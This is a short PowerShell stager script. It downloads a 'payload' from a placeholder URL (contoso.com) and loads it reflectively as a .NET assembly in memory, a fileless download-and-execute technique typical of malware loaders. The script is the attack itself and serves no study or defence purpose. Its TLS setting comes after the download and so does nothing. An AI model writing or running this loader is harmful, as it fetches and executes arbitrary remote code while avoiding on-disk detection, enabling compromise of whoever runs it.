[CmdletBinding()]
param(
    [string]$PayloadUrl = "https://contoso.com/payload.bin"
)
$StageBytes = (New-Object System.Net.WebClient).DownloadData($PayloadUrl)
[Reflection.Assembly]::Load($StageBytes)
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
